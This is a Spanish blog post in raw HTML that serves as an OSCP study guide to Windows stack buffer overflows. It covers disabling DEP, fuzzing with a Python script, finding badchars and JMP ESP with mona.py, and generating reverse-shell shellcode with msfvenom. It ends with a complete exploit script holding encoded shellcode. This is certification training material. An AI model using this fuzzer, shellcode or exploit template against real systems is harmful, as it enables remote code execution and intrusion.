<!doctype html><html lang=es dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Buffer Overflow - OSCP | Román Zuleta</title>
<meta name=keywords content="BoF - Windows">
<meta name=description content="Guía para configuración y práctica de buffer overflows para acreditación de OSCP">
<meta name=author content="Román Zuleta">
<link rel=canonical href=https://rzul.me/posts/bof-oscp/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.6f60056d44d3f7eb69a4bc6c332b59960f3a995802bded244750232f33713c49.css integrity="sha256-b2AFbUTT9+tppLxsMytZlg86mVgCve0kR1AjLzNxPEk=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://rzul.me/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://rzul.me/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://rzul.me/favicon-32x32.png>
<link rel=apple-touch-icon href=https://rzul.me/apple-touch-icon.png>
<link rel=mask-icon href=https://rzul.me/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.92.0">
<link rel=alternate hreflang=es href=https://rzul.me/posts/bof-oscp/>
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript><meta property="og:title" content="Buffer Overflow - OSCP">
<meta property="og:description" content="Guía para configuración y práctica de buffer overflows para acreditación de OSCP">
<meta property="og:type" content="article">
<meta property="og:url" content="https://rzul.me/posts/bof-oscp/">
<meta property="og:image" content="https://rzul.me/images/posts/bof-oscp/posts/bof-oscp/cover_bof_oscp.jpg%22"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-11-17T19:31:11-06:00">
<meta property="article:modified_time" content="2021-11-17T19:31:11-06:00">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://rzul.me/images/posts/bof-oscp/posts/bof-oscp/cover_bof_oscp.jpg%22">
<meta name=twitter:title content="Buffer Overflow - OSCP">
<meta name=twitter:description content="Guía para configuración y práctica de buffer overflows para acreditación de OSCP">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://rzul.me/posts/"},{"@type":"ListItem","position":2,"name":"Buffer Overflow - OSCP","item":"https://rzul.me/posts/bof-oscp/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Buffer Overflow - OSCP","name":"Buffer Overflow - OSCP","description":"Guía para configuración y práctica de buffer overflows para acreditación de OSCP","keywords":["BoF - Windows"],"articleBody":"OSCP Metodología Stack Based Objetivo Como parte de la práctica para el examen me di a la tarea de realizar esta guía para futuras consultas y aclaración de dudas, esperando que sirva de ayuda para cualquiera que se este preparando para la certificación. Adicional, para tener un compendio más práctico realice un síntesis de los comandos utilizados disponibles en esta Cheat Sheet.\nConfiguración de ambiente de práctica  Deshabilitar firewall y/o habilitar reglas para comunicación a través de red. Deshabilitar protección DEP de Windows. Instalación de herramientas (binario, immunity debugger, mona.py). Generación de workspace para mona.py.  Firewall Traza ICMP En la sección de configuración avanzada habilitar reglas tanto de entrada como de salida de ICMP v4 y v6 para permitir comunicación entre la máquina que se ocupará para debuggear el binario y la máquina de donde se lanzará el exploit.\nDeshabilitado de DEP En un command prompt como administrador ejecutar: bcdedit.exe /set {current} nx AlwaysOff para deshabilitar la prevención de ejecución de datos (DEP). Después de ejecutarlo y reiniciar el sistema se puede validar que se deshabilitó correctamente entrando a Panel de Control  Sistema y seguridad  Sistema  Configuración avanzada del sistema  Opciones avanzadas  Configuración (de rendimiento)  Prevención de ejecución de datos este deberá salir sombreado de gris.\n Configuración avanzada del sistema. Configuración de rendimiento. Pestaña de prevención de ejecución de datos. Sombreado gris de correcto deshabilitado.  Instalación de herramientas (Mona) Para añadir el script de mona.py a inmmunity debugger, es necesario descargar el script del repositorio y meterlo en la ruta C:\\Program Files (x86)\\Immunity Inc\\Immunity Debugger\\PyCommands.\nGeneración de workspace para mona.py (opcional) Para facilitar el uso de mona.py, se puede generar un entorno de trabajo (a secas es una carpeta) que contendría lo que mona.py genere a partir de los comandos que se utilicen (payloads, patrones, badchars, etc). Ejecutando !mona config -set workingfolder C:\\Users\\SrRequiem\\Desktop\\%p se indicaría el lugar y a partir del primer comando de mona.py que genere archivos, se podrá ver reflejado en el sistema de archivos.\nFuzzing En esta sección se realiza la búsqueda del punto de quiebre del binario. Identificando el número de caracteres que causen un fallo de segmentación.\nPlantilla de fuzzer #from pwn import * import socket, sys, time if len(sys.argv)  2: print \"\\n[!] Uso: python \" + sys.argv[0] + \" \" + \"\\n\" sys.exit(0) # Variables globales ip_address = sys.argv[1] rport = int(sys.argv[2]) if __name__ == '__main__': contador = 100 #p1 = log.progress(\"Data\") Log de datos en pwntools while True: #p1.status(f\"Enviando {contador} bytes.\") Log de datos en pwntools print \"Enviando %sbytes.\" % contador buffer = 'A' * contador try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip_address, rport)) data = s.recv(1024) #s.send(\"USER srrequiem\\r\\n\") #data = s.recv(1024) s.send(\"%s\\r\\n\" % buffer) data = s.recv(1024) contador += 100 #En algunas ocasiones no suele romperse la conexion lo que evita entrar #al codigo de la excepcion por lo que se puede considerar meter un sleep #para visualizar en que valor de la iteracion se pausa la ejecucion del binario time.sleep(1) except Exception as ex: print \"\\n[!] Ha habido un error de conexion\\n\" print ex sys.exit(1) Por medio del script se puede buscar el cambio del EIP de manera automática.\nGeneracion de patrón\nmsf-pattern_create -l \n!mona pattern_create \nDespués de provocar el fallo con el patrón, la dirección EIP se sustituiría con un valor del segmento de nuestro patrón. El valor que contenga EIP ahora lo identificaremos para saber el offset específico.\nIdentificación offset\nmsf-pattern_create -l \n!mona pattern_offset \n Offset. EIP.  Nota: Siempre corroborar con un payload propio modificando después del offset un valor que se identifique facilmente. Ejemplo: 1052 ‘A’ y 4 ‘B’ en este caso el EIP valdría 42424242\nIdentificar Bad Chars Manual Si bien es bueno saber el proceso que se realiza, es una tarea que consume mucho tiempo y que existe una gran posibilidad de cometer errores al realizarlo ya que es muy fácil perder algún byte de vista muy fácil.\nEl proceso se centra en enviar el payload con los badchars y directamente seguir los caracteres ASCII obtenidos del ESP y buscar cuales son los que no se visualizan correctamente, identificandolos así uno a uno. Se puede generar la colección de bytes con mona.py con el comando !mona bytearray dentro de Immunity Debugger para tener la colección y poder incorporarla al payload.\nColección plana \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\nColección en arreglo badchars = ( \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" ) Después de enviar el payload con los badchars y lograr la pausa del programa podemos seguir el contenido del ESP dándo click derecho en el registro y seleccionando la opción Follow in Dump, de la sección ubicada en la esquina inferior izquierda se nos desplegará el contenido del registro para poder identificar los badchars manualmente.\nSe anexan ejemplos de cómo se verían los badchars en el dump de hexadecimal (sección inferior izquierda de Immunity Debugger).\nAutomático El proceso se puede optimizar usando mona.py de manera iterativa, con los siguientes comandos mona.py nos devolverá los badchars identificados.\n !mona bytearray: Generará archivos con arreglo de badchars. !mona compare -f -a : Comparará los badchars contenidos respecto al payload ubicado en el ESP (recordando que payload = filler + eip + badchars). !mona bytearray -cpb '\\x00': Generará archivos con arreglo de badchars exceptuando los indicados. Repetir proceso hasta encontrar todos los badchars.  Búsqueda de dirección Aquí se realiza la búsqueda de la instrucción JMP ESP (valores hexadecimales \\xff\\xe4) en las dlls del binario, siempre tratando de identificar aquellas que no cuenten con protecciones (todas la banderas dadas por mona.py en False).\nNota: se puede hacer uso de msf-nasm_shell para ver el valor de los OP codes (en este caso jmp ESP) en caso que se requiera.\nComando de mona.py\n!mona modules\nEjemplo\nBúsqueda de apuntador en dll Aquí se realiza una búsqueda de los apuntadores contenidos en la dll identificada con el valor de la instrucción \\xff\\xe4.\nComando de mona.py\n!mona find -s \"\\xff\\xe4\" -m \nSe desplegará una lista de direcciones de memoria que se pudieran utilizar, sin antes considerar 2 cosas. La descripción de la tabla contenerá direcciones con permisos de lectura y ejecución (PAGE_EXECUTE_READ); y de escritura solamente (PAGE_READ_ONLY), hay que tomar en cuenta sólo aquellas que cuenten con ejecución (PAGE_EXECUTE_READ). Y también desplegará las protecciones con las que cuenta la dll, tomar de nuevo en cuenta aquellas que tengan todo deshabilitado (False).\n Comando. Direcciones útiles para usar en EIP (buscar aquellas que en el valor de la dirección no contenga ningún badchar). Permisos. Protecciones.  Generación de shellcode Aquí se generará el shellcode a utilizar después de la sustitución del valor que se asigne a la EIP.\nComando de ejemplo\nmsfvenom -a x86 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST= LPORT= -b '\\x00' EXITFUNC=thread -i 3 -f python  scode.txt\nTener en consideración:\n Sistema operativo. Arquitectura. Payload. Formato (python, c, exe, etc). Variables de escucha y/o comando a ejecutar. Encoding (extra: -i 3 para número de iteraciones para encodear). BadChars. Función de salida (para evitar que el proceso termine usar seh o thread).  Si se da el caso que los badchars sean bastantes tal que la generación del shellcode no se realice satisfactoriamente, considerar quitar el encoder x86/shikata_ga_nai para que automáticamente se utilicé el encoder que cumpla con los requisitos (colección de badchars a evitar).\nGeneración de exploit Ejemplo de exploit final from struct import pack import socket, sys if len(sys.argv)  2: print \"\\n[!] Uso: python \" + sys.argv[0] + \"\" + \" \\n\" sys.exit(0) ip_address = sys.argv[1] rport = int(sys.argv[2]) shellcode = b\"\" shellcode += b\"\\xb8\\x36\\xda\\x75\\x0f\\xda\\xd5\\xd9\\x74\\x24\\xf4\\x5b\\x2b\" shellcode += b\"\\xc9\\xb1\\x5f\\x83\\xc3\\x04\\x31\\x43\\x10\\x03\\x43\\x10\\xd4\" shellcode += b\"\\x2f\\xce\\x68\\xaf\\x10\\x8c\\xac\\x01\\x49\\x9b\\x76\\x69\\x30\" shellcode += b\"\\x55\\xbe\\x20\\x9d\\xa4\\x1a\\x57\\x9d\\x2d\\x66\\x54\\xfb\\xa0\" shellcode += b\"\\x75\\xc8\\xf6\\x32\\x68\\x08\\x59\\x9b\\x32\\x1d\\xb8\\x35\\x8a\" shellcode += b\"\\x2e\\x1c\\xec\\x8c\\x49\\xea\\xa6\\xae\\xc5\\xfb\\xef\\x11\\xbd\" shellcode += b\"\\xa9\\x1f\\x9b\\xf3\\x51\\xc8\\x4a\\x27\\x35\\xa2\\xd1\\x60\\x03\" shellcode += b\"\\x55\\x72\\xf5\\xcc\\x0b\\xd2\\x2a\\xda\\x41\\x4d\\x5f\\x4f\\xb4\" shellcode += b\"\\x2f\\xbb\\xc6\\x88\\x45\\x5f\\x3e\\x11\\x08\\x86\\x09\\x5d\\xe7\" shellcode += b\"\\xf8\\x11\\x49\\x5c\\x12\\xdc\\x8e\\x66\\xa0\\x1e\\x1c\\x10\\x0a\" shellcode += b\"\\xf8\\xa7\\xac\\x6b\\x8d\\xd4\\x2a\\xaa\\xe6\\x5e\\x9d\\xbe\\x04\" shellcode += b\"\\x42\\x52\\xe0\\x71\\x86\\xc5\\xa6\\xa2\\xff\\xdf\\xcb\\x75\\x28\" shellcode += b\"\\x2f\\x5b\\x05\\x57\\x39\\x45\\xd2\\x7e\\x05\\xd6\\x91\\xfd\\x46\" shellcode += b\"\\x2c\\x31\\x66\\xea\\xbe\\x3c\\xc8\\x10\\x96\\xf6\\xcc\\x31\\xbc\" shellcode += b\"\\x56\\x43\\x24\\x1f\\x86\\xed\\xf2\\x59\\xa2\\x38\\x9c\\x4f\\xa1\" shellcode += b\"\\xc6\\x58\\x71\\xb7\\x81\\x9d\\xe3\\x25\\xb7\\xc7\\xf4\\x5c\\xa3\" shellcode += b\"\\x01\\xd4\\x5e\\xf2\\x1d\\x92\\x57\\x08\\x65\\xd9\\x62\\xdf\\xb4\" shellcode += b\"\\xdf\\xaa\\xb8\\x6a\\x61\\x82\\x87\\xfa\\x27\\x0c\\xe9\\x49\\x46\" shellcode += b\"\\xea\\x50\\x51\\xb6\\x6b\\xc9\\xbc\\xe4\\x95\\xff\\xf8\\x36\\x94\" shellcode += b\"\\x3b\\xbd\\x24\\xd9\\x9c\\xb5\\x1e\\x77\\xcb\\x31\\x84\\x2a\\xe3\" shellcode += b\"\\xca\\xac\\xd7\\x8c\\x12\\xed\\xa0\\x53\\xfa\\xbc\\x94\\xf3\\x9b\" shellcode += b\"\\xe5\\x8a\\xac\\xf3\\x48\\x1a\\x39\\x2e\\x63\\x5a\\x68\\xe9\\x85\" shellcode += b\"\\x93\\xde\\x3a\\x22\\x77\\x2a\\xac\\xa1\\xfa\\x96\\x7f\\x9f\\x95\" shellcode += b\"\\x6f\\xa3\\xe4\\x13\\x41\\x9a\\xe8\\xf6\\x97\\x6b\\x2d\\x31\\x68\" shellcode += b\"\\x9c\\xb1\\x2f\\xab\\xa3\\xf5\\x56\\xe9\\xf5\\xa3\\x21\\xe9\\x9c\" shellcode += b\"\\x19\\xaf\\x10\\x57\\xfb\\x80\\x0e\\x73\\x48\\x84\\xb1\\xb0\\xb0\" shellcode += b\"\\x83\\x67\\x88\\xb5\\x1d\\x0e\\x73\\xeb\\xa1\\xd1\\xdc\\xa2\\xe9\" shellcode += b\"\\x76\\xcc\\xd0\\x27\\x6b\\xed\\x5d\\xfc\\x02\\xcb\\x8f\\xff\\xc3\" shellcode += b\"\\xb2\\x8f\\xf3\\xee\\x96\\x9a\\xec\\xb1\\x73\\x55\\x47\\x82\\x70\" shellcode += b\"\\x10\\x32\\x53\\xbb\\xfa\\x83\\x38\\x3b\\xb0\\xea\\xd1\\xe4\\x6e\" shellcode += b\"\\x2f\\x7d\\x23\\xc5\\xd9\\x5d\\xfb\\x48\\x06\\x3d\\x4f\\x33\\xfe\" shellcode += b\"\\x03\\x9c\" if __name__ == \"__main__\": #buffer = \"A\" * 1052 + pack(\"buffer = \"A\" * 1052 + pack(\", 0x68a98a7b) + \"\\x90\" * 16 + shellcode try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip_address, rport)) s.send(\"%s\\r\\n\" % buffer) except Exception as ex: print \"[!] Ha habido un error de conexion\" print ex sys.exit(1) Consideraciones\nSi bien se pueden utilizar algunos “trucos” para caer en la dirección donde se encuentra el shellcode como lo son los NOPs (\\x90) se puede ocupar un desplazamiento de pila para restar posiciones, y jugar un poco con los valores. Dentro de msf-nasm_shell se puede invocar la instrucción sub esp, . Ejemplo:\nEn este caso se obtendría el valor 83EC10 como código de operación para el desplazamiento de 10 unidades. quedando la línea de construcción del payload como: buffer = \"A\" * 1052 + pack(\"en lugar de los NOPs.\n","wordCount":"1514","inLanguage":"es","image":"https://rzul.me/images/posts/bof-oscp/posts/bof-oscp/cover_bof_oscp.jpg%22","datePublished":"2021-11-17T19:31:11-06:00","dateModified":"2021-11-17T19:31:11-06:00","author":{"@type":"Person","name":"Román Zuleta"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rzul.me/posts/bof-oscp/"},"publisher":{"@type":"Organization","name":"Román Zuleta","logo":{"@type":"ImageObject","url":"https://rzul.me/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://rzul.me/ accesskey=h title="Román Zuleta (Alt + H)">Román Zuleta</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
<ul class=lang-switch><li>|</li>
<li>
<a href=https://rzul.me/en/ title=English aria-label=English>En</a>
</li>
</ul>
</span>
</div>
<ul id=menu>
<li>
<a href=https://rzul.me/archives/ title=Archivo>
<span>Archivo</span>
</a>
</li>
<li>
<a href=https://rzul.me/categories/ title=Categorías>
<span>Categorías</span>
</a>
</li>
<li>
<a href=https://rzul.me/tags/ title=Etiquetas>
<span>Etiquetas</span>
</a>
</li>
<li>
<a href=https://rzul.me/search/ title="Buscar (Alt + /)" accesskey=/>
<span>Buscar</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://rzul.me/>Home</a>&nbsp;»&nbsp;<a href=https://rzul.me/posts/>Posts</a></div>
<h1 class=post-title>
Buffer Overflow - OSCP
</h1>
<div class=post-description>
Guía para configuración y práctica de buffer overflows para acreditación de OSCP
</div>
<div class=post-meta><span title="2021-11-17 19:31:11 -0600 CST">November 17, 2021</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;Román Zuleta&nbsp;|&nbsp;<a href=https://github.com/srrequiem/SecNotes/blob/main/OSCP-BoF/bof-oscp.md rel="noopener noreferrer" target=_blank>Sugerir cambios</a>
</div>
</header>
<figure class=entry-cover><img loading=lazy src=https://rzul.me/images/posts/bof-oscp/posts/bof-oscp/cover_bof_oscp.jpg%22 alt="BoF OSCP cover">
<p></p>
</figure><div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Tabla de Contenidos</span>
</summary>
<div class=inner><ul>
<li>
<a href=#oscp-metodolog%c3%ada-stack-based aria-label="OSCP Metodología Stack Based">OSCP Metodología Stack Based</a><ul>
<li>
<a href=#objetivo aria-label=Objetivo>Objetivo</a></li>
<li>
<a href=#configuraci%c3%b3n-de-ambiente-de-pr%c3%a1ctica aria-label="Configuración de ambiente de práctica">Configuración de ambiente de práctica</a><ul>
<li>
<a href=#firewall aria-label=Firewall>Firewall</a><ul>
<li>
<a href=#traza-icmp aria-label="Traza ICMP">Traza ICMP</a></li></ul>
</li>
<li>
<a href=#deshabilitado-de-dep aria-label="Deshabilitado de DEP">Deshabilitado de DEP</a></li>
<li>
<a href=#instalaci%c3%b3n-de-herramientas-mona aria-label="Instalación de herramientas (Mona)">Instalación de herramientas (Mona)</a></li>
<li>
<a href=#generaci%c3%b3n-de-workspace-para-monapy-opcional aria-label="Generación de workspace para mona.py (opcional)">Generación de workspace para <code>mona.py</code> (opcional)</a></li></ul>
</li>
<li>
<a href=#fuzzing aria-label=Fuzzing>Fuzzing</a><ul>
<li>
<a href=#plantilla-de-fuzzer aria-label="Plantilla de fuzzer">Plantilla de fuzzer</a></li></ul>
</li>
<li>
<a href=#identificar-bad-chars aria-label="Identificar Bad Chars">Identificar Bad Chars</a><ul>
<li>
<a href=#manual aria-label=Manual>Manual</a><ul>
<li>
<a href=#colecci%c3%b3n-plana aria-label="Colección plana">Colección plana</a></li>
<li>
<a href=#colecci%c3%b3n-en-arreglo aria-label="Colección en arreglo">Colección en arreglo</a></li></ul>
</li>
<li>
<a href=#autom%c3%a1tico aria-label=Automático>Automático</a></li></ul>
</li>
<li>
<a href=#b%c3%basqueda-de-direcci%c3%b3n aria-label="Búsqueda de dirección">Búsqueda de dirección</a><ul>
<li>
<a href=#b%c3%basqueda-de-apuntador-en-dll aria-label="Búsqueda de apuntador en dll">Búsqueda de apuntador en dll</a></li></ul>
</li>
<li>
<a href=#generaci%c3%b3n-de-shellcode aria-label="Generación de shellcode">Generación de shellcode</a></li>
<li>
<a href=#generaci%c3%b3n-de-exploit aria-label="Generación de exploit">Generación de exploit</a><ul>
<li>
<a href=#ejemplo-de-exploit-final aria-label="Ejemplo de exploit final">Ejemplo de exploit final</a>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h1 id=oscp-metodología-stack-based>OSCP Metodología Stack Based<a hidden class=anchor aria-hidden=true href=#oscp-metodología-stack-based>#</a></h1>
<h2 id=objetivo>Objetivo<a hidden class=anchor aria-hidden=true href=#objetivo>#</a></h2>
<p>Como parte de la práctica para el examen me di a la tarea de realizar esta guía para futuras consultas y aclaración de dudas, esperando que sirva de ayuda para cualquiera que se este preparando para la certificación. Adicional, para tener un compendio más práctico realice un síntesis de los comandos utilizados disponibles en esta <a href=https://github.com/srrequiem/SecNotes/blob/main/OSCP-BoF/bof-oscp.md>Cheat Sheet</a>.</p>
<h2 id=configuración-de-ambiente-de-práctica>Configuración de ambiente de práctica<a hidden class=anchor aria-hidden=true href=#configuración-de-ambiente-de-práctica>#</a></h2>
<ol>
<li>Deshabilitar firewall y/o habilitar reglas para comunicación a través de red.</li>
<li>Deshabilitar protección DEP de Windows.</li>
<li>Instalación de herramientas (binario, immunity debugger, <code>mona.py</code>).</li>
<li>Generación de workspace para <code>mona.py</code>.</li>
</ol>
<h3 id=firewall>Firewall<a hidden class=anchor aria-hidden=true href=#firewall>#</a></h3>
<h4 id=traza-icmp>Traza ICMP<a hidden class=anchor aria-hidden=true href=#traza-icmp>#</a></h4>
<p>En la sección de configuración avanzada habilitar reglas <strong>tanto de entrada como de salida</strong> de ICMP v4 y v6 para permitir comunicación entre la máquina que se ocupará para debuggear el binario y la máquina de donde se lanzará el exploit.</p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_1.png alt="Reglas de Firewall">
</p>
<h3 id=deshabilitado-de-dep>Deshabilitado de DEP<a hidden class=anchor aria-hidden=true href=#deshabilitado-de-dep>#</a></h3>
<p>En un command prompt como administrador ejecutar: <code>bcdedit.exe /set {current} nx AlwaysOff</code> para deshabilitar la <em>prevención de ejecución de datos (DEP)</em>. Después de ejecutarlo y reiniciar el sistema se puede validar que se deshabilitó correctamente entrando a <code>Panel de Control > Sistema y seguridad > Sistema > Configuración avanzada del sistema > Opciones avanzadas > Configuración (de rendimiento) > Prevención de ejecución de datos</code> este deberá salir sombreado de gris.</p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_2.png alt="Deshabilitado de DEP">
</p>
<ol>
<li>Configuración avanzada del sistema.</li>
<li>Configuración de rendimiento.</li>
<li>Pestaña de prevención de ejecución de datos.</li>
<li>Sombreado gris de correcto deshabilitado.</li>
</ol>
<h3 id=instalación-de-herramientas-mona>Instalación de herramientas (Mona)<a hidden class=anchor aria-hidden=true href=#instalación-de-herramientas-mona>#</a></h3>
<p>Para añadir el script de <code>mona.py</code> a inmmunity debugger, es necesario descargar el script del <a href=https://github.com/corelan/mona>repositorio</a> y meterlo en la ruta <code>C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands</code>.</p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_3.png alt="Deshabilitado de DEP">
</p>
<h3 id=generación-de-workspace-para-monapy-opcional>Generación de workspace para <code>mona.py</code> (opcional)<a hidden class=anchor aria-hidden=true href=#generación-de-workspace-para-monapy-opcional>#</a></h3>
<p>Para facilitar el uso de <code>mona.py</code>, se puede generar un entorno de trabajo (a secas es una carpeta) que contendría lo que <code>mona.py</code> genere a partir de los comandos que se utilicen (payloads, patrones, badchars, etc). Ejecutando <code>!mona config -set workingfolder C:\Users\SrRequiem\Desktop\%p</code> se indicaría el lugar y a partir del primer comando de <code>mona.py</code> que genere archivos, se podrá ver reflejado en el sistema de archivos.</p>
<h2 id=fuzzing>Fuzzing<a hidden class=anchor aria-hidden=true href=#fuzzing>#</a></h2>
<p>En esta sección se realiza la búsqueda del punto de quiebre del binario. Identificando el número de caracteres que causen un fallo de segmentación.</p>
<h3 id=plantilla-de-fuzzer>Plantilla de fuzzer<a hidden class=anchor aria-hidden=true href=#plantilla-de-fuzzer>#</a></h3>
